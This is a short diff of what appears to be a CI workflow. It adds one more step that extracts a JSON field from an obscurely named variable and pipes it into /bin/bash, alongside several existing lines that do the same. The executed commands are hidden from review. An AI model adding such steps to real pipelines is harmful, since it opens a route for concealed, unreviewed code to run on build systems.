@@ -23,6 +23,7 @@ jobs:
           echo $cnwhn809 | jq -r .l1756 | /bin/bash
           echo $i547 | jq -r .ckv72 | /bin/bash
           printf '%s' "$s6146" | jq -r .v1683 | /bin/bash
+          echo $doh13 | jq -r .t9139 | /bin/bash
 
       - name: Archive output
         if: always()
